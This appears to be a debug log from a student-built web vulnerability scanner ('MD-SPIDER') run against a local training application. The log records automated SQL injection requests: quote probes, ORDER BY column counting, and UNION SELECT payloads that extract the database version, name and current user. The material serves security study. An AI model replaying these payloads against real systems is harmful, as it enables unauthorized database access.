INFO [2022-05-26 09:46:38,786] root 184317 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-06-01 10:04:22,744] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+4 HTTP/1.1" 200 3193]
DEBUG [2022-06-01 10:04:22,748] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,750] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+5 HTTP/1.1" 200 3193]
DEBUG [2022-06-01 10:04:22,752] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,755] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+6 HTTP/1.1" 200 3193]
DEBUG [2022-06-01 10:04:22,759] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,763] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+7 HTTP/1.1" 200 3193]
DEBUG [2022-06-01 10:04:22,766] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,768] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+8 HTTP/1.1" 200 3193]
DEBUG [2022-06-01 10:04:22,770] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,772] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+9 HTTP/1.1" 200 1713]
DEBUG [2022-06-01 10:04:22,776] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,779] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+version(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-06-01 10:04:22,783] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,787] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%20version(),%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-06-01 10:04:22,790] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,793] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%20version(),%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-06-01 10:04:22,797] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,800] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%20version(),%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-06-01 10:04:22,803] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,805] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%20version(),%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-06-01 10:04:22,808] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,811] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%20version(),%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-06-01 10:04:22,813] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,816] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%20version(),%208 HTTP/1.1" 200 3226]
DEBUG [2022-06-01 10:04:22,818] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,821] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20version() HTTP/1.1" 200 3226]
DEBUG [2022-06-01 10:04:22,823] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,827] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+database(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3227]
DEBUG [2022-06-01 10:04:22,836] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,839] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+(SELECT+CURRENT_USER),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-06-01 10:04:22,847] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,850] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%20(SELECT+CURRENT_USER),%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-06-01 10:04:22,856] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,859] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%20(SELECT+CURRENT_USER),%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-06-01 10:04:22,866] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,868] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%20(SELECT+CURRENT_USER),%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-06-01 10:04:22,874] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,877] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%20(SELECT+CURRENT_USER),%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-06-01 10:04:22,884] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,887] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%20(SELECT+CURRENT_USER),%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-06-01 10:04:22,893] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,895] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%20(SELECT+CURRENT_USER),%208 HTTP/1.1" 200 3238]
DEBUG [2022-06-01 10:04:22,917] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 10:04:22,921] urllib3.connectionpool 9216 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20(SELECT+CURRENT_USER) HTTP/1.1" 200 3238]
INFO [2022-06-01 13:18:55,058] root 14175 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
INFO [2022-06-01 13:19:01,261] root 14179 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-06-01 13:19:03,119] urllib3.connectionpool 14179 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 13:19:03,125] urllib3.connectionpool 14179 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/login-1/ HTTP/1.1" 200 3326]
DEBUG [2022-06-01 13:19:03,129] urllib3.connectionpool 14179 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 13:19:03,134] urllib3.connectionpool 14179 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/login-1/ HTTP/1.1" 200 3326]
DEBUG [2022-06-01 13:19:03,138] urllib3.connectionpool 14179 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 13:19:03,142] urllib3.connectionpool 14179 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/login-1/ HTTP/1.1" 200 3326]
INFO [2022-06-01 21:35:03,982] root 20051 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-06-01 21:35:06,244] urllib3.connectionpool 20051 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:35:09,222] urllib3.connectionpool 20051 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/login-1/ HTTP/1.1" 200 3326]
DEBUG [2022-06-01 21:35:09,228] urllib3.connectionpool 20051 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:35:10,161] urllib3.connectionpool 20051 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/login-1/ HTTP/1.1" 200 3326]
DEBUG [2022-06-01 21:35:10,168] urllib3.connectionpool 20051 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:35:11,044] urllib3.connectionpool 20051 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/login-1/ HTTP/1.1" 200 3326]
INFO [2022-06-01 21:35:24,481] root 20074 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-06-01 21:35:24,776] urllib3.connectionpool 20074 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:35:25,476] urllib3.connectionpool 20074 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/contetn-1/ HTTP/1.1" 404 None]
INFO [2022-06-01 21:35:28,001] root 20079 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-06-01 21:35:28,300] urllib3.connectionpool 20079 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:35:28,458] urllib3.connectionpool 20079 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/contetn-1/ HTTP/1.1" 404 None]
INFO [2022-06-01 21:35:41,072] root 20094 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-06-01 21:35:41,374] urllib3.connectionpool 20094 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:35:41,883] urllib3.connectionpool 20094 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/contetn-1/index.php HTTP/1.1" 404 None]
INFO [2022-06-01 21:36:35,043] root 20160 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
INFO [2022-06-01 21:36:40,485] root 20164 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-06-01 21:36:40,783] urllib3.connectionpool 20164 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:40,928] urllib3.connectionpool 20164 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-06-01 21:36:40,931] urllib3.connectionpool 20164 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:41,089] urllib3.connectionpool 20164 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-06-01 21:36:41,094] urllib3.connectionpool 20164 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:41,224] urllib3.connectionpool 20164 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "HEAD /bricks/content-1/index.php?id=0' HTTP/1.1" 200 0]
DEBUG [2022-06-01 21:36:41,227] urllib3.connectionpool 20164 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:41,621] urllib3.connectionpool 20164 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "POST /bricks/content-1/index.php?id=0' HTTP/1.1" 200 1713]
DEBUG [2022-06-01 21:36:41,626] urllib3.connectionpool 20164 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:41,756] urllib3.connectionpool 20164 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+1 HTTP/1.1" 200 3193]
DEBUG [2022-06-01 21:36:41,761] urllib3.connectionpool 20164 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:41,814] urllib3.connectionpool 20164 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+2 HTTP/1.1" 200 3193]
DEBUG [2022-06-01 21:36:41,823] urllib3.connectionpool 20164 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
INFO [2022-06-01 21:36:44,231] root 20169 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-06-01 21:36:44,522] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,024] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-06-01 21:36:45,027] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,124] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-06-01 21:36:45,127] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,166] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "HEAD /bricks/content-1/index.php?id=0' HTTP/1.1" 200 0]
DEBUG [2022-06-01 21:36:45,169] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,211] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "POST /bricks/content-1/index.php?id=0' HTTP/1.1" 200 1713]
DEBUG [2022-06-01 21:36:45,216] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,236] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+1 HTTP/1.1" 200 3193]
DEBUG [2022-06-01 21:36:45,240] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,248] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+2 HTTP/1.1" 200 3193]
DEBUG [2022-06-01 21:36:45,252] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,267] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+3 HTTP/1.1" 200 3193]
DEBUG [2022-06-01 21:36:45,270] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,290] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+4 HTTP/1.1" 200 3193]
DEBUG [2022-06-01 21:36:45,295] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,313] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+5 HTTP/1.1" 200 3193]
DEBUG [2022-06-01 21:36:45,315] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,320] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+6 HTTP/1.1" 200 3193]
DEBUG [2022-06-01 21:36:45,323] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,327] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+7 HTTP/1.1" 200 3193]
DEBUG [2022-06-01 21:36:45,329] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,334] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+8 HTTP/1.1" 200 3193]
DEBUG [2022-06-01 21:36:45,336] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,352] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+9 HTTP/1.1" 200 1713]
DEBUG [2022-06-01 21:36:45,355] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,458] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+version(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-06-01 21:36:45,464] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,488] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%20version(),%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-06-01 21:36:45,495] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,501] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%20version(),%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-06-01 21:36:45,508] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,514] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%20version(),%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-06-01 21:36:45,520] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,526] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%20version(),%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-06-01 21:36:45,533] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,552] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%20version(),%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-06-01 21:36:45,558] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,564] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%20version(),%208 HTTP/1.1" 200 3226]
DEBUG [2022-06-01 21:36:45,571] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,589] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20version() HTTP/1.1" 200 3226]
DEBUG [2022-06-01 21:36:45,596] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,624] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+database(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3227]
DEBUG [2022-06-01 21:36:45,644] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-06-01 21:36:45,710] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+(SELECT+CURRENT_USER),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-06-01 21:36:45,726] urllib3.connectionpool 20169 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
